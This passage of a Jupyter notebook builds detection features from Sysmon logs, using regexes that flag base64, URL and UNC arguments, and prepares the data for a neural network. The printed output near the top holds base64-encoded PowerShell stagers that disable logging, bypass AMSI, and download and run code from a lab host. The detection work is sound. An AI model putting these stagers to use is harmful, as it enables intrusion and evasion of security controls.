     "text": "-noninteractive -Sta -encodedCommand CgAgACAAIAAgACAAIAAgACAAIAAgACAAIABBAGQAZAAtAFQAeQBwAGUAIAAtAEEAcwBzAGUAbQBiAGwAeQAgAFAAcgBlAHMAZQBuAHQAYQB0AGkAbwBuAEMAbwByAGUACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABbAFcAaQBuAGQAbwB3AHMALgBDAGwAaQBwAGIAbwBhAHIAZABdADoAOgBHAGUAdABUAGUAeAB0ACgAKQAgAC0AcgBlAHAAbABhAGMAZQAgACIAYAByACIALAAgACcAJwAgAC0AcwBwAGwAaQB0ACAAIgBgAG4AIgAgACAACgAgACAAIAAgACAAIAAgACAA -inputFormat xml -outputFormat xml \n\n-NoP -NonI -W Hidden -enc SQBmACgAJABQAFMAVgBFAFIAcwBJAE8ATgBUAGEAQgBsAGUALgBQAFMAVgBlAFIAcwBpAG8AbgAuAE0AQQBqAE8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAcwBTAEUAbQBCAEwAeQAuAEcARQBUAFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAVABGAGkARQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBmACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAEUAdABWAEEATAB1AGUAKAAkAG4AVQBMAGwAKQA7AEkAZgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAFYAQQBsAD0AWwBDAG8AbABsAGUAQwB0AGkAbwBuAHMALgBHAGUATgBFAFIASQBjAC4ARABJAGMAVABJAE8AbgBhAHIAWQBbAFMAVABSAGkAbgBnACwAUwB5AFMAVABFAG0ALgBPAEIAagBlAGMAdABdAF0AOgA6AG4ARQB3ACgAKQA7ACQAdgBhAEwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAdgBBAEwALgBBAEQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAEEATAB9AEUATABTAEUAewBbAFMAQwBSAEkAcAB0AEIATABvAEMAawBdAC4AIgBHAGUAVABGAGkARQBgAEwARAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBhAGwAVQBlACgAJABOAFUATABMACwAKABOAEUAVwAtAE8AQgBqAGUAQwBUACAAQwBvAGwAbABFAEMAVABpAE8AbgBTAC4ARwBlAG4AZQBSAEkAQwAuAEgAQQBzAEgAUwBFAHQAWwBzAHQAUgBJAE4AZwBdACkAKQB9AFsAUgBlAEYAXQAuAEEAUwBTAEUAbQBiAGwAeQAuAEcARQBUAFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAfAA/AHsAJABfAH0AfAAlAHsAJABfAC4ARwBlAFQARgBJAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAGEAbAB1AEUAKAAkAE4AVQBsAEwALAAkAFQAcgBVAGUAKQB9ADsAfQA7AFsAUwBZAFMAdABlAG0ALgBOAEUAVAAuAFMAZQBSAFYASQBjAEUAUABvAGkAbgB0AE0AYQBOAEEAZwBFAHIAXQA6ADoARQBYAFAAZQBjAHQAMQAwADAAQwBvAE4AVABpAE4AdQBlAD0AMAA7ACQAdwBjAD0ATgBFAFcALQBPAGIASgBlAGMAVAAgAFMAeQBTAFQAZQBtAC4ATgBlAFQALgBXAGUAYgBDAGwAaQBlAG4AVAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAFcAYwAuAEgAZQBhAGQARQBSAHMALgBBAEQARAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAHcAYwAuAFAAUgBPAFgAeQA9AFsAUwB5AHMAVABlAG0ALgBOAEUAdAAuAFcARQBiAFIAZQBRAHUARQBzAFQAXQA6ADoARABlAGYAQQB1AGwAdABXAEUAQgBQAFIATwB4AHkAOwAkAFcAYwAuAFAAUgBvAFgAeQAuAEMAUgBlAGQAZQBOAFQASQBBAEwAcwAgAD0AIABbAFMAeQBzAFQARQBtAC4ATgBFAFQALgBDAHIAZQBkAEUAbgBUAGkAQQBMAEMAQQBDAGgAZQBdADoAOgBEAGUAZgBhAHUATABUAE4ARQBUAHcATwBSAEsAQwByAEUAZABFAE4AdABpAEEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAFMAdABlAE0ALgBUAEUAWABUAC4ARQBOAGMAbwBEAGkATgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAWQB0AGUAUwAoACcARAAqADEAQQA1ADsASwBmAHQAXgB7AHMASgA4AGwAQABSAF8APABaAG4ASQBkADcAPgB+AEIANgBFAFMAbwBlACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIAZwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAFUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAWABPAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMgA0AC4AMQAzADUAOgA4ADAAOAAwACcAOwAkAHQAPQAnAC8AbABvAGcAaQBuAC8AcAByAG8AYwBlAHMAcwAuAHAAaABwACcAOwAkAHcAQwAuAEgAZQBhAGQAZQBSAFMALgBBAEQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIAcwBlAHMAcwBpAG8AbgA9AFMATQBMAFgAVwBRAGIAaQBFADMAWgAvAE4ARABHAHEATAB1ADgAVAA5AEUAdABCAHIARABRAD0AIgApADsAJABEAEEAdABhAD0AJABXAEMALgBEAE8AVwBuAGwAbwBBAEQARABhAFQAQQAoACQAUwBFAHIAKwAkAHQAKQA7ACQASQBWAD0AJABEAGEAVABBAFsAMAAuAC4AMwBdADsAJABkAGEAdABBAD0AJABkAEEAdABBAFsANAAuAC4AJABkAEEAVABhAC4AbABFAE4AZwB0AEgAXQA7AC0AagBvAGkAbgBbAEMAaABhAFIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAVABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA= \n\n-noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBlAHIAUwBpAE8ATgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBJAG8ATgAuAE0AQQBqAG8AUgAgAC0ARwBlACAAMwApAHsAJABHAFAARgA9AFsAcgBFAGYAXQAuAEEAUwBTAEUATQBiAEwAeQAuAEcARQBUAFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAEkAZQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAEUAdABWAGEATABVAGUAKAAkAG4AVQBMAEwAKQA7AEkARgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAQQBMAD0AWwBDAG8ATABMAGUAQwB0AGkAbwBOAHMALgBHAGUAbgBlAFIASQBDAC4ARABJAEMAVABpAG8AbgBhAHIAWQBbAFMAVAByAGkAbgBnACwAUwB5AFMAVABlAE0ALgBPAGIASgBlAEMAVABdAF0AOgA6AE4AZQB3ACgAKQA7ACQAVgBhAGwALgBBAGQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBBAEwALgBBAEQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAGEAbAB9AEUAbABzAEUAewBbAFMAYwByAGkAUAB0AEIATABPAGMASwBdAC4AIgBHAGUAdABGAGkARQBgAEwAZAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAHQAVgBBAEwAdQBlACgAJABuAFUATABsACwAKABOAGUAVwAtAE8AYgBqAGUAYwBUACAAQwBvAEwAbABFAEMAdABpAE8AbgBzAC4ARwBlAG4AZQBSAEkAYwAuAEgAYQBTAGgAUwBlAHQAWwBzAHQAcgBpAE4ARwBdACkAKQB9AFsAUgBlAGYAXQAuAEEAUwBzAEUATQBiAGwAWQAuAEcAZQBUAFQAeQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAfAA/AHsAJABfAH0AfAAlAHsAJABfAC4ARwBFAFQARgBJAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEATAB1AEUAKAAkAG4AVQBMAEwALAAkAFQAUgB1AGUAKQB9ADsAfQA7AFsAUwB5AFMAVABFAG0ALgBOAEUAdAAuAFMAZQByAFYASQBjAEUAUABvAGkAbgB0AE0AQQBOAGEARwBFAFIAXQA6ADoARQBYAHAAZQBDAHQAMQAwADAAQwBvAE4AVABpAG4AdQBFAD0AMAA7ACQAdwBDAD0ATgBlAHcALQBPAGIASgBlAGMAVAAgAFMAeQBzAFQARQBtAC4ATgBFAHQALgBXAEUAQgBDAGwASQBFAE4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAFcAYwAuAEgAZQBBAGQAZQBSAFMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAQwAuAFAAcgBPAFgAWQA9AFsAUwBZAHMAVABFAE0ALgBOAEUAdAAuAFcAZQBiAFIAZQBRAHUAZQBzAFQAXQA6ADoARABlAGYAYQBVAGwAVABXAGUAQgBQAHIATwB4AFkAOwAkAHcAQwAuAFAAcgBvAHgAWQAuAEMAUgBlAGQAZQBuAFQASQBBAGwAUwAgAD0AIABbAFMAWQBzAFQARQBtAC4ATgBFAFQALgBDAFIAZQBkAEUATgB0AGkAYQBsAEMAQQBjAEgAZQBdADoAOgBEAEUARgBBAFUAbABUAE4AZQBUAHcAbwByAEsAQwByAGUARABFAE4AVABpAGEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAHMAVABlAE0ALgBUAEUAeABUAC4ARQBuAEMAbwBkAGkATgBHAF0AOgA6AEEAUwBDAEkASQAuAEcARQBUAEIAeQB0AEUAcwAoACcARAAqADEAQQA1ADsASwBmAHQAXgB7AHMASgA4AGwAQABSAF8APABaAG4ASQBkADcAPgB+AEIANgBFAFMAbwBlACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAFUAbgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABPAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMgA0AC4AMQAzADUAOgA4ADAAOAAwACcAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJABXAEMALgBIAEUAQQBEAGUAcgBzAC4AQQBkAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHMAZQBzAHMAaQBvAG4APQBqAHMAagBkAG0AMABoAE4AagBIAHgAYgBaAEcASABrAGEAeQBpACsAcgBOAFkAYwBKAFYAcwA9ACIAKQA7ACQARABhAHQAQQA9ACQAVwBDAC4ARABvAFcATgBsAG8AQQBEAEQAYQBUAGEAKAAkAHMARQByACsAJABUACkAOwAkAGkAdgA9ACQAZABhAFQAQQBbADAALgAuADMAXQA7ACQARABBAFQAYQA9ACQAZABhAFQAQQBbADQALgAuACQARABBAHQAQQAuAEwARQBOAGcAVABoAF0AOwAtAEoAbwBpAE4AWwBDAGgAQQByAFsAXQBdACgAJgAgACQAUgAgACQAZABBAHQAQQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA \n\n"
    }
   ],
   "source": [
    "# there's matches\n",
    "for i in newdf['arguments'][newdf['arguments'].apply(lambda x: re.search(b64_regex, x)).notnull()]:\n",
    "    print(i,\"\\n\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [],
   "source": [
    "# map this search as 0 and 1 using astype(int)\n",
    "b64s = newdf['arguments'].apply(lambda x: re.search(b64_regex, x)).notnull()\n",
    "newdf['b64'] = b64s.astype(int)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": "891     True\n2610    True\n3409    True\nName: arguments, dtype: bool"
     },
     "metadata": {},
     "execution_count": 34
    }
   ],
   "source": [
    "b64s[b64s]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": "0    0\n1    0\n2    0\n3    0\n4    0\nName: b64, dtype: int32"
     },
     "metadata": {},
     "execution_count": 36
    }
   ],
   "source": [
    "newdf['b64'][0:5]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "2. URL / UNC Paths?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {},
   "outputs": [
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": "Int64Index([], dtype='int64')"
     },
     "metadata": {},
     "execution_count": 37
    }
   ],
   "source": [
    "# matches if there's call for some file with extension (at the end dot) via UNC path\n",
    "unc_regex = r\"\\\\\\\\[a-zA-Z0-9]+\\\\[a-zA-Z0-9\\\\]+\\.\"\n",
    "uncs = newdf['arguments'][newdf['arguments'].apply(lambda x: re.search(unc_regex, x)).notnull()]\n",
    "# we didn't had any of these launches in dataset btw\n",
    "uncs[uncs].index"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "metadata": {},
   "outputs": [
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": "<re.Match object; span=(7, 21), match='\\\\\\\\test\\\\test\\\\r.'>"
     },
     "metadata": {},
     "execution_count": 38
    }
   ],
   "source": [
    "# but it works\n",
    "test = r\"rundll \\\\test\\test\\r.dll\"\n",
    "re.search(unc_regex, test)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {},
   "outputs": [
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": "3567    True\nName: arguments, dtype: bool"
     },
     "metadata": {},
     "execution_count": 39
    }
   ],
   "source": [
    "url_regex = r\"https?:\\/\\/(www\\.)?[-a-zA-Z0-9@:%._\\+~#=]{1,256}\\.[a-zA-Z0-9()]{1,6}\\b([-a-zA-Z0-9()@:%_\\+.~#?&//=]*)\"\n",
    "urls = newdf['arguments'].apply(lambda x: re.search(url_regex, x)).notnull()\n",
    "urls[urls]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "metadata": {},
   "outputs": [
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": "'-IOAVHost 2781761e-28e0-4109-99fe-b9d127c57afe|C:\\\\Users\\\\anon\\\\Downloads\\\\quarterly_results.docm.vbs|http://192.168.124.135/quarterly_results.docm.vbs'"
     },
     "metadata": {},
     "execution_count": 40
    }
   ],
   "source": [
    "# indeed URL in arguments\n",
    "newdf['arguments'][3567]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Merge both URL and UNC as boolean (whether there is/none UNC/URL in arguments)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "metadata": {},
   "outputs": [],
   "source": [
    "# verified pd.concat part - merges two boolean series correctly\n",
    "newdf['unc_url'] = pd.concat([uncs, urls]).astype(int)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "metadata": {},
   "outputs": [
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": "                      UtcTime ProcessId EventID                  User  \\\n3567  2020-05-12 14:53:21.922      9444       1  DESKTOP-TATBGQH\\anon   \n\n                                       Image ImageLoaded  \\\n3567  C:\\Windows\\System32\\browser_broker.exe        None   \n\n                                            CommandLine  \\\n3567  C:\\Windows\\system32\\browser_broker.exe -IOAVHo...   \n\n                                 ParentImage  \\\n3567  C:\\Windows\\System32\\browser_broker.exe   \n\n                                      ParentCommandLine DestinationPort  \\\n3567  C:\\Windows\\system32\\browser_broker.exe -Embedding            None   \n\n     Protocol QueryName TargetFilename TargetObject  \\\n3567     None      None           None         None   \n\n                                                    raw              binary  \\\n3567  <Event xmlns=\"http://schemas.microsoft.com/win...  browser_broker.exe   \n\n                     path                                          arguments  \\\n3567  c:\\windows\\system32  -IOAVHost 2781761e-28e0-4109-99fe-b9d127c57afe...   \n\n      b64  unc_url  \n3567    0        1  ",
      "text/html": "<div>\n<style scoped>\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n    .dataframe tbody tr th {\n        vertical-align: top;\n    }\n\n    .dataframe thead th {\n        text-align: right;\n    }\n</style>\n<table border=\"1\" class=\"dataframe\">\n  <thead>\n    <tr style=\"text-align: right;\">\n      <th></th>\n      <th>UtcTime</th>\n      <th>ProcessId</th>\n      <th>EventID</th>\n      <th>User</th>\n      <th>Image</th>\n      <th>ImageLoaded</th>\n      <th>CommandLine</th>\n      <th>ParentImage</th>\n      <th>ParentCommandLine</th>\n      <th>DestinationPort</th>\n      <th>Protocol</th>\n      <th>QueryName</th>\n      <th>TargetFilename</th>\n      <th>TargetObject</th>\n      <th>raw</th>\n      <th>binary</th>\n      <th>path</th>\n      <th>arguments</th>\n      <th>b64</th>\n      <th>unc_url</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <th>3567</th>\n      <td>2020-05-12 14:53:21.922</td>\n      <td>9444</td>\n      <td>1</td>\n      <td>DESKTOP-TATBGQH\\anon</td>\n      <td>C:\\Windows\\System32\\browser_broker.exe</td>\n      <td>None</td>\n      <td>C:\\Windows\\system32\\browser_broker.exe -IOAVHo...</td>\n      <td>C:\\Windows\\System32\\browser_broker.exe</td>\n      <td>C:\\Windows\\system32\\browser_broker.exe -Embedding</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>&lt;Event xmlns=\"http://schemas.microsoft.com/win...</td>\n      <td>browser_broker.exe</td>\n      <td>c:\\windows\\system32</td>\n      <td>-IOAVHost 2781761e-28e0-4109-99fe-b9d127c57afe...</td>\n      <td>0</td>\n      <td>1</td>\n    </tr>\n  </tbody>\n</table>\n</div>"
     },
     "metadata": {},
     "execution_count": 47
    }
   ],
   "source": [
    "# check if correct marking\n",
    "newdf[newdf['unc_url'].astype(bool)]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "If performs network conncetions"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "metadata": {},
   "outputs": [],
   "source": [
    "newdf['network'] = newdf['Protocol'].notnull().astype(int)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Work with this data for now"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 96,
   "metadata": {},
   "outputs": [
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": "  ProcessId          binary  EventID  \\\n0      5380    explorer.exe        7   \n1      5380    explorer.exe       11   \n2      5080         mmc.exe       11   \n3      1520  powershell.exe        3   \n4         4          system        3   \n\n                                         path  unc_url  b64  network  \n0                                  c:\\windows        0    0        0  \n1                                  c:\\windows        0    0        0  \n2                         c:\\windows\\system32        0    0        0  \n3  c:\\windows\\system32\\windowspowershell\\v1.0        0    0        1  \n4                                                    0    0        1  ",
      "text/html": "<div>\n<style scoped>\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n    .dataframe tbody tr th {\n        vertical-align: top;\n    }\n\n    .dataframe thead th {\n        text-align: right;\n    }\n</style>\n<table border=\"1\" class=\"dataframe\">\n  <thead>\n    <tr style=\"text-align: right;\">\n      <th></th>\n      <th>ProcessId</th>\n      <th>binary</th>\n      <th>EventID</th>\n      <th>path</th>\n      <th>unc_url</th>\n      <th>b64</th>\n      <th>network</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <th>0</th>\n      <td>5380</td>\n      <td>explorer.exe</td>\n      <td>7</td>\n      <td>c:\\windows</td>\n      <td>0</td>\n      <td>0</td>\n      <td>0</td>\n    </tr>\n    <tr>\n      <th>1</th>\n      <td>5380</td>\n      <td>explorer.exe</td>\n      <td>11</td>\n      <td>c:\\windows</td>\n      <td>0</td>\n      <td>0</td>\n      <td>0</td>\n    </tr>\n    <tr>\n      <th>2</th>\n      <td>5080</td>\n      <td>mmc.exe</td>\n      <td>11</td>\n      <td>c:\\windows\\system32</td>\n      <td>0</td>\n      <td>0</td>\n      <td>0</td>\n    </tr>\n    <tr>\n      <th>3</th>\n      <td>1520</td>\n      <td>powershell.exe</td>\n      <td>3</td>\n      <td>c:\\windows\\system32\\windowspowershell\\v1.0</td>\n      <td>0</td>\n      <td>0</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>4</th>\n      <td>4</td>\n      <td>system</td>\n      <td>3</td>\n      <td></td>\n      <td>0</td>\n      <td>0</td>\n      <td>1</td>\n    </tr>\n  </tbody>\n</table>\n</div>"
     },
     "metadata": {},
     "execution_count": 96
    }
   ],
   "source": [
    "newdf = newdf[['ProcessId','binary','EventID','path', 'unc_url', 'b64', 'network']]\n",
    "# treat eventID as int8\n",
    "newdf['EventID'] = newdf['EventID'].astype('int8')\n",
    "newdf.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 97,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": "<class 'pandas.core.frame.DataFrame'>\nInt64Index: 3712 entries, 0 to 3771\nData columns (total 7 columns):\nProcessId    3712 non-null object\nbinary       3712 non-null object\nEventID      3712 non-null int8\npath         3712 non-null object\nunc_url      3712 non-null int32\nb64          3712 non-null int32\nnetwork      3712 non-null int32\ndtypes: int32(3), int8(1), object(3)\nmemory usage: 323.1+ KB\n"
    }
   ],
   "source": [
    "newdf.info()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Other preprocessing:\n",
    "- encoding values that still textual\n",
    "- grouping by PID\n",
    "- padding"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 100,
   "metadata": {},
   "outputs": [],
   "source": [
    "from sklearn.preprocessing import LabelEncoder, OneHotEncoder\n",
    "from sklearn.model_selection import train_test_split\n",
    "from tensorflow.keras.preprocessing.sequence import pad_sequences\n",
    "from datetime import datetime\n",
    "import numpy as np"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Workflow?\n",
    "\n",
    "0. Read valid/malicious PID\n",
    "1. Encode as labels binary and path\n",
    "2. Groupby PID\n",
    "3. Add label to df  \n",
    "    NOTE! At this stage you should have df with `['label','binary (encoded)', 'path (encoded)', 'EventID', 'unc_url', 'b64', 'network']`\n",
    "4. Pad "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 67,
   "metadata": {},
   "outputs": [
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": "ProcessId\n11044     65\n1396      68\n9636      70\n3244      72\n8096      73\n7584      89\n1532      90\n4752      90\n4556      97\n9308     107\n10116    110\n3748     114\n9116     163\n9716     168\n1520     284\ndtype: int64"
     },
     "metadata": {},
     "execution_count": 67
    }
